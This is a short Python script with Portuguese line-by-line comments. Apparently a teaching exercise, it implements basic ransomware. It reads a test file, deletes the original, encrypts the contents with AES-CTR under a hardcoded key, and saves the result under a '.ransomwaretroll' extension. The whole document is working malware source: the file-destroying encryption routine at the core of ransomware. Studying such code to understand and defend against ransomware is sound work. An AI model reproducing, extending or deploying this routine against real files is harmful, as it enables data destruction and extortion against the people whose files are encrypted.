import os ##importa a biblioteca os para enviar comandos ao sistema operacional
import pyaes ## importa a biblioteca pyaes para utilizar comando de criptografia

## abrir o arquivo a ser criptografado

## criada variavel file_name para armazenar o arquivo teste.txt
file_name = 'teste.txt'
## criada variavel file para armazenar conteúdo da variavel file_name, 'rb' comando para somente ler a variavel
file = open(file_name,'rb')
## criada variavel file_data para receber o conteudo lido na variavel file
file_data = file.read()
## fechando a variavel file
file.close()

## remover o arquivo original

## chama função os.remove com o parametro file_name que contem o nome do arquivo a ser deletado
os.remove(file_name)

## definir a chave de encriptacao

## criada variavel key para armazenar a chave de encriptacao
key = b'testeransomwares'
## criada variavel aes para armazenar a funçao de encriptacao com a variavel key como parametro
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo

## criada variavel crypto_data para receber o arquivo criptografado na variavel file_data
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado

## criada variavel new_file para armazenar o nome do arquivo adicionando .ransomwaretroll ao final, concatenado
new_file = file_name + '.ransomwaretroll'
## variavel new_file recebe os dados, funcao open.() a funcao 'wb' escreve os dados
new_file = open(f'{new_file}','wb')
## funcao .write() escreve os dados criptografados da variavel crypto_data na variavel new_file 
new_file.write(crypto_data)
# funcao .close() fecha a variavel new_file
new_file.close()
